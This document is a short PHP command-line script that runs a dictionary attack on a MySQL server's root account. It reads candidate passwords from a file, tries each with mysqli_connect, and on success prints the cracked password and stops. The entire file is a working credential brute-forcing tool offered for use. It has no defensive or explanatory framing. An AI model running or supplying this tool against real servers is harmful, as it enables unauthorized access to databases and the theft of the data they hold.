<?php
set_time_limit(0);
error_reporting(E_ERROR);
$sttime=time();
if($argc!=3){

	     print_r('
================================================================================
Usage: php '.$argv[0].' host passfiles
host: (ip/hostname)
passfiles: password files
Example: php '.$argv[0].' localhost C:\pass.txt
================================================================================
');
die;
}
$file=$argv[2];
$host=$argv[1];
$user="root";                                   
$password=file($file);
$dbname="information_schema";
echo "user:".$user."\r\n";
echo "host:".$host."\r\n";
echo "databse:".$dbname."\r\n";
echo "start time:".date('y-m-d h:i:s',$sttime)."\r\n";
for($i=0;$i<count($password);$i++)
{

	    $pass=str_replace("\n","",$password[$i]); 
//		    echo $pass."\r\n";
		    connect($host,$user,$pass,$dbname);
			    flush();
}
if($errno==0)
	    echo "crack faile\r\n";

$edtime=time();
				echo "end time:".date('y-m-d h:i:s',$edtime)."\r\n";
function connect($host,$user,$pass,$dbname)
{

	    global $errno;
		    $conn=mysqli_connect($host,$user,$pass,$dbname);
		        if($conn)
		 	{

				$errno=1;
				echo $host.":crack success,pass: ".$pass."\r\n";
				$edtime=time();
				echo "end time:".date('y-m-d h:i:s',$edtime)."\r\n";
				die;
			   }
				else
							            $errno=0;
}
?>
